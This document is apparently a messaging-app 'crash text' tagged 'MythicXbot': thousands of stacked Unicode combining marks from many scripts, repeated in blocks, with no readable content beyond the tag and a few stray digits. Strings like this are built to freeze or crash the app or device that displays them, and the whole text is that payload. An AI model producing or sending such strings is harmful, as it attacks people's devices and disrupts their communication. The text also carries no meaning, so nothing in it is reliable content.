᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًّّّّّّّّّّّّ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞ